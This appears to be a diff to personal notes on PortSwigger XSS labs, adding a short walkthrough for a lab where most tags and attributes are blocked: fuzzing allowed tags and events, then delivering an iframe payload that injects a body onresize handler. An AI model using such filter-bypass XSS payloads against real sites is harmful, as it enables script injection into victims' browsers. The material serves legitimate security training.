@@ -33,7 +33,11 @@
 13. [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
 
 14. [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
-
+    - Search for <>
+    - Use this request to fuzz all the tags from xss cheatsheat
+    - Now use the event list to fuzz all the event for the identified tag.
+    - Store and deliver `<iframe src="https://0a3800b603b89b9cb80639c4000700df.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width="100px">` to the victim using exploit server.
+    
 15. [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
 
 16. [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
